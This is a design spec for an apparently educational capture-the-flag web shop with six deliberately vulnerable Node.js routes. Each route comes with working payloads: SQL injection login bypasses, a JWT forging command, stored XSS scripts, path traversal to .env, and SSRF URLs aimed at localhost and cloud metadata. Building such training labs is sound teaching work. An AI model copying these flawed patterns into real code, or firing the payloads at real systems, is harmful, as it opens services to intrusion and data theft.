# 🏴 CTF_CHALLENGES.md — Vulnerability Design Specifications

> **Full design spec for each CTF challenge: what it is, how it's implemented, how it's triggered, and what the flag rewards.**

---

## Overview

| Flag | Name | Vulnerability | Points | Difficulty | OWASP Category |
|------|------|--------------|--------|-----------|---------------|
| 🏴 Flag 1 | The Open Door | SQL Injection | 100 | 🟢 Easy | A03:2021 Injection |
| 🏴 Flag 2 | Token Heist | Broken JWT Auth | 150 | 🟡 Medium | A07:2021 Auth Failures |
| 🏴 Flag 3 | Phantom Script | Stored XSS | 150 | 🟡 Medium | A03:2021 Injection |
| 🏴 Flag 4 | Wrong Package | IDOR | 200 | 🟡 Medium | A01:2021 Broken Access Control |
| 🏴 Flag 5 | Deep Files | Path Traversal | 250 | 🔴 Hard | A01:2021 Broken Access Control |
| 🏴 Flag 6 | Inner Network | SSRF | 300 | 🔴 Hard | A10:2021 SSRF |

**Total Points Possible: 1,150**

---

## 🏴 Flag 1 — "The Open Door"

### Vulnerability
**SQL Injection** — Authentication Bypass

### Story Context
> *"Word on the street is the admin account uses a simple login form. No captcha. No rate limit. You know what to do."*

### Implementation

**File**: `server/routes/auth.js` → `POST /auth/login`

```javascript
// INTENTIONALLY VULNERABLE — See SKILL.md
router.post('/login', (req, res, next) => {
  const { username, password } = req.body;
  
  // Raw string concatenation — vulnerable to SQL injection
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  
  try {
    const user = db.prepare(query).get();  // .get() throws on malformed SQL
    
    if (user) {
      req.session.userId = user.id;
      req.session.role = user.role;
      
      // Award flag if admin account was bypassed via injection
      if (user.role === 'admin') {
        const flag = flagService.award({ userId: null, flagName: 'flag_sqli_login', payloadUsed: username, req });
        return res.json({ success: true, redirect: '/market', flag: flag.token, message: 'Welcome back, admin.' });
      }
      
      return res.json({ success: true, redirect: '/market' });
    }
    
    res.status(401).json({ success: false, message: 'Invalid credentials.' });
  } catch (err) {
    // Verbose error intentional — shows DB error to attacker
    // VERBOSE_ERROR_INTENTIONAL
    res.status(500).json({ success: false, error: err.message });
  }
});
```

### Trigger Condition
- `username` payload contains SQL injection that evaluates `WHERE` to true
- Result set includes the admin user (role = 'admin')

### Winning Payloads
```sql
' OR 1=1 --
' OR 'a'='a' --
admin' --
' UNION SELECT 1,'admin','admin123','admin',null,null --
```

### Hint (Hacker Mode)
> *"This login looks old-fashioned. What happens if the username field doesn't like apostrophes?"*

---

## 🏴 Flag 2 — "Token Heist"

### Vulnerability
**Broken JWT Authentication** — Weak Secret + No Expiry

### Story Context
> *"Got a valid session? The admin panel is locked behind a JWT. But the secret looks... familiar."*

### Implementation

**File**: `server/utils/jwt.js`

```javascript
// INTENTIONALLY WEAK — Do not change JWT_SECRET
const JWT_SECRET = process.env.JWT_SECRET || 'supersecret';

const sign = (payload) => jwt.sign(payload, JWT_SECRET);    // No expiresIn
const verify = (token) => jwt.verify(token, JWT_SECRET);
```

**File**: `server/routes/admin.js`

```javascript
// IDOR on JWT verification — only checks signature, not role
router.get('/admin', (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);  // Verifies but doesn't check role
    // Missing: if (decoded.role !== 'admin') throw ...
    
    const flag = flagService.award({ userId: decoded.id, flagName: 'flag_jwt_forge', payloadUsed: token, req });
    res.json({ success: true, data: adminDashboardData(), flag: flag.token });
  } catch {
    res.status(403).json({ success: false, message: 'Invalid token.' });
  }
});
```

### Trigger Condition
- Attacker crafts a JWT with `{ role: 'admin' }` signed with `supersecret`
- Presents the forged token to `/admin`

### Attack Steps
```bash
# 1. Decode any existing JWT (from login)
# 2. Note the secret from /api/debug (another vulnerability path) or brute-force
# 3. Forge token:
node -e "console.log(require('jsonwebtoken').sign({id:1,role:'admin'}, 'supersecret'))"
# 4. Use forged token on /admin
curl -H "Authorization: Bearer <forged_token>" http://localhost:3000/admin
```

### Terminal Command Hint
```
crack-jwt
→ "JWT tokens have three parts. The last is a signature. If the secret is weak, it can be guessed or brute-forced. Try: john, hashcat, or jwt_tool."
```

---

## 🏴 Flag 3 — "Phantom Script"

### Vulnerability
**Stored XSS** — Unsanitized Comment Content

### Story Context
> *"The listing comments are unmoderated. If your 'review' runs in someone else's browser, you'll know you've made your mark."*

### Implementation

**File**: `server/routes/listings.js` → `POST /listings/:id/comments`

```javascript
router.post('/:id/comments', requireAuth, (req, res, next) => {
  const { content } = req.body;
  
  // INTENTIONALLY UNSANITIZED — Do not add sanitize-html here
  db.prepare(
    `INSERT INTO comments (listing_id, user_id, content) VALUES (?, ?, ?)`
  ).run(req.params.id, req.session.userId, content);
  
  res.json({ success: true });
});
```

**File**: `client/pages/listing.html` — comment render (frontend)

```javascript
// INTENTIONALLY UNSAFE innerHTML — Do not change to textContent
function renderComment(comment) {
  return `<div class="dm-comment">${comment.content}</div>`;  // XSS vector
}
```

### Trigger Condition
- User submits a comment containing a `<script>` tag or event handler
- Comment is rendered via `innerHTML` on page load
- Flag is awarded when the XSS payload executes and calls `/flags/xss-beacon`

### XSS Beacon
The server has a special endpoint that awards the flag when called by an XSS payload:

```javascript
// server/routes/flags.js
router.get('/xss-beacon', (req, res) => {
  const flag = flagService.award({ userId: req.session?.userId, flagName: 'flag_stored_xss', payloadUsed: 'xss-beacon', req });
  res.json({ flag: flag.token });
});
```

### Winning Payloads
```html
<script>fetch('/flags/xss-beacon').then(r=>r.json()).then(d=>alert(d.flag))</script>
<img src=x onerror="fetch('/flags/xss-beacon').then(r=>r.json()).then(d=>alert(d.flag))">
<svg onload="fetch('/flags/xss-beacon').then(r=>r.json()).then(d=>console.log(d.flag))">
```

---

## 🏴 Flag 4 — "Wrong Package"

### Vulnerability
**IDOR (Insecure Direct Object Reference)** — Order Access Without Ownership Check

### Story Context
> *"You placed order #12. But what's in order #3? Just change the number."*

### Implementation

**File**: `server/routes/orders.js`

```javascript
// IDOR — No ownership validation
// INTENTIONALLY VULNERABLE
router.get('/:id', requireAuth, (req, res, next) => {
  // Missing: WHERE buyer_id = req.session.userId
  const order = db.prepare('SELECT * FROM orders WHERE id = ?').get(req.params.id);
  
  if (!order) return res.status(404).json({ message: 'Order not found.' });
  
  // Flag awarded if user accesses an order that isn't theirs
  if (order.buyer_id !== req.session.userId) {
    const flag = flagService.award({ userId: req.session.userId, flagName: 'flag_idor_order', payloadUsed: req.params.id, req });
    return res.json({ success: true, data: order, flag: flag.token });
  }
  
  res.json({ success: true, data: order });
});
```

### Trigger Condition
- Authenticated user accesses `/orders/<N>` where N belongs to another user
- Seed data creates 20 orders across multiple users, with user 1 owning orders 11–20

### Attack Steps
1. Login as any user
2. Visit `/orders/1` through `/orders/10`
3. Receive another user's order details + flag

---

## 🏴 Flag 5 — "Deep Files"

### Vulnerability
**Path Traversal** — Reading Files Outside Web Root

### Story Context
> *"The file preview endpoint accepts a filename. What if you give it a path instead of a name?"*

### Implementation

**File**: `server/routes/files.js`

```javascript
const PUBLIC_DIR = path.join(__dirname, '../../client/public');

// INTENTIONALLY VULNERABLE — No path sanitization
router.get('/', (req, res, next) => {
  const { file } = req.query;  // e.g., ?file=readme.txt
  
  // Missing: path.resolve() check to ensure file stays within PUBLIC_DIR
  const filePath = path.join(PUBLIC_DIR, file);
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ message: 'File not found.' });
  }
  
  const content = fs.readFileSync(filePath, 'utf-8');
  
  // Flag awarded if .env or config file is read
  if (file.includes('..') && (file.includes('.env') || file.includes('config'))) {
    const flag = flagService.award({ userId: req.session?.userId, flagName: 'flag_path_traversal', payloadUsed: file, req });
    return res.send(`${content}\n\n<!-- FLAG: ${flag.token} -->`);
  }
  
  res.send(content);
});
```

### Winning Payloads
```
GET /files?file=../../../.env
GET /files?file=../../server/db/schema.sql
GET /files?file=%2e%2e%2f%2e%2e%2f.env    (URL encoded)
```

---

## 🏴 Flag 6 — "Inner Network"

### Vulnerability
**SSRF (Server-Side Request Forgery)** — Unvalidated URL Fetch

### Story Context
> *"The listing preview fetches a URL server-side. What if you point it at the internal admin API?"*

### Implementation

**File**: `server/routes/fetch.js`

```javascript
const fetch = require('node-fetch');

// INTENTIONALLY VULNERABLE — No URL validation or whitelist
router.post('/fetch-preview', async (req, res, next) => {
  const { url } = req.body;
  
  try {
    const response = await fetch(url);  // ← Raw SSRF
    const body = await response.text();
    
    // Flag awarded if internal service is probed
    if (url.includes('localhost') || url.includes('127.0.0.1') || url.includes('169.254')) {
      const flag = flagService.award({ userId: req.session?.userId, flagName: 'flag_ssrf', payloadUsed: url, req });
      return res.json({ content: body, flag: flag.token });
    }
    
    res.json({ content: body.substring(0, 2000) });
  } catch (err) {
    res.status(500).json({ error: err.message });  // VERBOSE_ERROR_INTENTIONAL
  }
});
```

### Winning Payloads
```json
{ "url": "http://localhost:3000/admin" }
{ "url": "http://127.0.0.1:3000/api/internal/users" }
{ "url": "http://169.254.169.254/latest/meta-data/" }
```

---

## Flag Seed Data

`server/db/seed.js` must insert these records into the `flags` table:

```javascript
const flags = [
  { name: 'flag_sqli_login',    vulnerability: 'SQL Injection',    points: 100, difficulty: 'easy'   },
  { name: 'flag_jwt_forge',     vulnerability: 'Broken JWT Auth',  points: 150, difficulty: 'medium' },
  { name: 'flag_stored_xss',    vulnerability: 'Stored XSS',       points: 150, difficulty: 'medium' },
  { name: 'flag_idor_order',    vulnerability: 'IDOR',             points: 200, difficulty: 'medium' },
  { name: 'flag_path_traversal',vulnerability: 'Path Traversal',   points: 250, difficulty: 'hard'   },
  { name: 'flag_ssrf',          vulnerability: 'SSRF',             points: 300, difficulty: 'hard'   },
];
```

Tokens are generated at seed time:

```javascript
const crypto = require('crypto');
const FLAG_SALT = process.env.FLAG_SALT || 'DMS_INTERNAL_SALT';

function generateToken(name) {
  const hex = crypto.createHmac('sha256', FLAG_SALT).update(name).digest('hex').slice(0, 8);
  const diff = flags.find(f => f.name === name)?.difficulty || 'unknown';
  const vuln = name.replace('flag_', '').replace(/_/g, '-');
  return `DMS{${hex}_${vuln}_${diff}}`;
}
```

---

## Instructor Notes

- Solution writeups live in `docs/writeups/` (git-ignored in student forks)
- Flags are regenerated on each `npm run db:seed` — tokens change between instances
- To reset a student's progress: `DELETE FROM flag_captures WHERE user_id = <id>`
- To disable a specific challenge: set `active = 0` on the flag record (add column if needed)
